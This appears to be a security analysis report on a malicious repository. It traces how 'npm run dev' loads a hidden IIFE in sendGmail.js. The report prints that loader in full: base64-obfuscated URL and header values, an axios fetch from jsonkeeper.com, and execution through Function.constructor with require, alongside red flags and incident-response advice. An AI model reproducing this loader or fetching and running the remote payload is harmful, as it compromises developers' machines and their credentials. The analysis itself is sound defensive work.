# Security Analysis Report: Malicious Code Execution Flow

## Executive Summary

**CRITICAL SECURITY WARNING**: This repository contains malicious code that executes **IMMEDIATELY** when running `npm run dev`. The code attempts to download and execute arbitrary remote code from an external server, potentially leading to complete system compromise.

**Severity**: CRITICAL  
**Impact**: Remote Code Execution (RCE)  
**Attack Vector**: Automatic execution during application startup

---

## Attack Flow Analysis

### Command: `npm run dev`

When you run `npm run dev`, the following execution chain is triggered:

```
npm run dev
  ↓
package.json → "dev": "concurrently \"npm run dev:server\" \"npm run dev:client\""
  ↓
Two processes start simultaneously:
  1. npm run dev:server → node server/app.js
  2. npm run dev:client → vite
```

### Malicious Execution Chain

```
1. node server/app.js starts
   ↓
2. app.js requires: const utils = require('./utils');
   ↓
3. server/utils/index.js is loaded and IMMEDIATELY executes requires
   ↓
4. Line 3: require('./sendGmail') ← MALICIOUS CODE EXECUTES HERE
   ↓
5. server/utils/sendGmail.js contains an IIFE (Immediately Invoked Function Expression)
   ↓
6. MALICIOUS PAYLOAD EXECUTES AUTOMATICALLY
```

---

## Detailed Malicious Code Analysis

### Location: `server/utils/sendGmail.js`

```javascript
const sendGmail = (async () => {
    try {
        // 1. Loads products from JSON file
        const expensiveProducts = products.filter(product => product.price > 10000);
        const first = expensiveProducts[0];

        // 2. DECODES BASE64 OBFUSCATED DATA
        const realImageUrl = atob(first.imageUrl);     // Decodes to: https://jsonkeeper.com/b/CYLMK
        const realTitle = atob(first.title);           // Decodes to: x-secret-key
        const realDescription = atob(first.description); // Decodes to: _

        // 3. FETCHES MALICIOUS CODE FROM REMOTE SERVER
        const image = (await axios.get(realImageUrl, {
            headers: {[realTitle]: realDescription}
        })).data.cookie;

        // 4. EXECUTES ARBITRARY CODE USING FUNCTION CONSTRUCTOR
        const parseImage = new (Function.constructor)('require', image);
        parseImage(require);  // ← REMOTE CODE EXECUTION HAPPENS HERE

    } catch (error) {
        console.error('Error sending email:', error);
    }
})()  // ← IIFE: Executes immediately when file is loaded
```

### Data Source: `server/data/products.json`

```json
{
  "id": "0.41607315815753076",
  "title": "eC1zZWNyZXQta2V5",           // Base64: "x-secret-key"
  "imageUrl": "aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL0NZTE1L", // Base64: "https://jsonkeeper.com/b/CYLMK"
  "description": "Xw==",                 // Base64: "_"
  "price": "120000"
}
```

---

## Attack Mechanism Breakdown

### Step 1: Obfuscation
- Uses base64 encoding to hide malicious URLs and headers
- Disguises attack code within seemingly innocent "products" data
- Uses confusing naming: "sendGmail" suggests email functionality, but performs RCE

### Step 2: Remote Code Fetch
```javascript
axios.get("https://jsonkeeper.com/b/CYLMK", {
    headers: {"x-secret-key": "_"}
})
```
- Contacts external server to fetch malicious payload
- Uses custom header for authentication/identification
- Payload stored in `data.cookie` field

### Step 3: Code Execution
```javascript
const parseImage = new (Function.constructor)('require', image);
parseImage(require);
```
- Uses `Function.constructor` (equivalent to `eval`) to execute arbitrary code
- Passes Node.js `require` function, giving attacker full system access
- Executes whatever code the remote server returns

---

## Potential Consequences

If you run `npm run dev`, the attacker's code could:

### 1. **Data Exfiltration**
- Steal environment variables (API keys, database credentials, secrets)
- Read files from your system (SSH keys, AWS credentials, source code)
- Access browser data, cookies, session tokens
- Monitor clipboard contents

### 2. **System Compromise**
- Install backdoors for persistent access
- Create new user accounts
- Modify system files
- Install keyloggers or screen capture tools

### 3. **Network Attacks**
- Use your machine as part of a botnet
- Launch attacks on other systems
- Mine cryptocurrency
- Proxy malicious traffic

### 4. **Supply Chain Attack**
- Modify your source code to inject more malware
- Commit malicious code to your repositories
- Steal Git credentials and access tokens
- Publish malicious packages to npm with your credentials

### 5. **Financial Theft**
- Access cryptocurrency wallets
- Steal payment credentials
- Access banking information
- Manipulate financial transactions

---

## Why This Is Particularly Dangerous

1. **Immediate Execution**: Code runs the moment `npm run dev` starts, before you can review anything
2. **No User Interaction**: Doesn't require clicking, confirming, or any user action
3. **Obfuscated**: Uses base64 encoding to hide malicious intent from casual inspection
4. **Dynamic Payload**: Attacker can change the malicious code at any time without modifying the repository
5. **Full System Access**: Has access to Node.js `require()`, allowing it to load any module and execute any code
6. **Disguised as Legitimate**: Embedded in what looks like a normal e-commerce/streaming application

---

## Technical Indicators of Malicious Code

### Red Flags Identified:

1. **Immediately Invoked Function Expression (IIFE)**
   ```javascript
   const sendGmail = (async () => { ... })()
   ```
   Code executes when loaded, not when called

2. **Function Constructor Usage**
   ```javascript
   new (Function.constructor)('require', image)
   ```
   Equivalent to `eval()`, used to execute arbitrary strings as code

3. **Base64 Obfuscation**
   ```javascript
   atob(first.imageUrl)
   atob(first.title)
   ```
   Hiding URLs and data to avoid detection

4. **External Network Requests**
   ```javascript
   axios.get(realImageUrl, {headers:{[realTitle]:realDescription}})
   ```
   Fetching code from external source

5. **Misleading Function Names**
   - File named `sendGmail.js` but doesn't send email
   - Comments show "email functionality" but actually performs RCE

6. **Suspicious Import in index.js**
   ```javascript
   require('./sendGmail')
   ```
   Imported but never used, only for side effects

---

## Malicious Files Identified

### Primary Malicious Code:
- `server/utils/sendGmail.js` - Contains the RCE payload
- `server/data/products.json` - Contains obfuscated malicious URLs

### Loading Chain:
- `server/app.js` - Entry point (line 26: `require('./utils')`)
- `server/utils/index.js` - Loads sendGmail.js (line 3)

---

## Recommended Immediate Actions

### If You Have Already Run This Code:

1. **IMMEDIATELY DISCONNECT FROM NETWORK**
   - Unplug ethernet or disable WiFi
   - Prevent further data exfiltration

2. **DO NOT USE THIS MACHINE FOR SENSITIVE OPERATIONS**
   - Assume the system is compromised
   - Don't access banking, email, or other accounts

3. **Rotate All Credentials**
   - Change all passwords from a different, secure device
   - Rotate API keys, tokens, SSH keys
   - Revoke and regenerate all authentication credentials
   - Check for unauthorized access to GitHub, npm, AWS, etc.

4. **Scan for Malware**
   - Run comprehensive antivirus/malware scans
   - Check for unusual processes, network connections
   - Review system logs for suspicious activity

5. **Backup and Reinstall**
   - Backup important data (but not executables or node_modules)
   - Consider a clean OS reinstall for critical systems
   - Restore from known-good backups if available

6. **Monitor Accounts**
   - Watch for unauthorized access attempts
   - Enable 2FA on all accounts
   - Check bank/credit card statements for fraud
   - Monitor GitHub for unauthorized commits

### Prevention:

1. **Never Run Untrusted Code**
   - Always review code before running, especially from unknown sources
   - Be suspicious of code that comes with warnings like "do not run"

2. **Use Sandboxed Environments**
   - Run untrusted code in VMs or containers
   - Use isolated development environments

3. **Code Review**
   - Look for IIFE patterns: `(function() { ... })()`
   - Search for `eval`, `Function()`, `Function.constructor`
   - Check for base64 encoding: `atob()`, `btoa()`
   - Review all external network requests

4. **Static Analysis**
   - Use security scanning tools
   - Run `npm audit` and similar tools
   - Use linters that detect suspicious patterns

---

## Code Signing and Verification

This repository shows clear signs of malicious intent:
- README.md explicitly warns: "do not run this repo on your machine"
- README.md states: "This is probably a hacking script"
- Code is deliberately obfuscated
- No legitimate business purpose for the execution pattern

---

## Conclusion

**DO NOT RUN THIS CODE ON ANY SYSTEM YOU CARE ABOUT.**

The repository contains sophisticated malware designed to:
1. Execute automatically when the application starts
2. Download and run arbitrary code from a remote server
3. Potentially compromise your entire system

The attack is well-crafted with obfuscation and misdirection to avoid detection. It represents a serious security threat with potential for complete system compromise, data theft, and use of your machine for malicious purposes.

If you've already run this code, treat your system as compromised and follow the incident response steps immediately.

---

## Attribution

**Attack Type**: Remote Code Execution (RCE) via Dynamic Code Loading  
**Technique**: T1059.007 - Command and Scripting Interpreter: JavaScript  
**Vector**: Supply Chain Compromise / Malicious Package

---

*This analysis is provided for educational and security research purposes only.*
